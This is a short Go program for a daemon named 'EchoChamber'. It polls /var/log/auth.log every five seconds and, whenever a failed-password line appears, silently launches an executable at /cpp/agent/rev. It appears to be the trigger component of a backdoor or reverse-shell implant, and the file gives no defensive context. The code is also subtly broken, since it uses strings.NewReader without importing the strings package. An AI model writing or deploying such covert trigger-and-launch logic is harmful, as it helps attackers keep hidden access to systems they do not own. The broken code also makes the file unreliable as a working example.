package main
import (
  "bufio"
  "fmt"
  "os/exec"
  "regexp"
  "time"
)

func main() {
  fmt.Println("[*] EchoChamber daemon started.")
  for {
    cmd := exec.Command("tail", "-n", "10", "/var/log/auth.log")
    out, _ := cmd.Output()
    scanner := bufio.NewScanner(stringReader(string(out)))
    for scanner.Scan() {
      line := scanner.Text()
      matched, _ := regexp.MatchString("Failed password for .* from", line)
      if matched {
        fmt.Println("[!] Trigger matched: ", line)
        exec.Command("/cpp/agent/rev").Start()
      }
    }
    time.Sleep(5 * time.Second)
  }
}

func stringReader(s string) *bufio.Reader {
  return bufio.NewReader(strings.NewReader(s))
}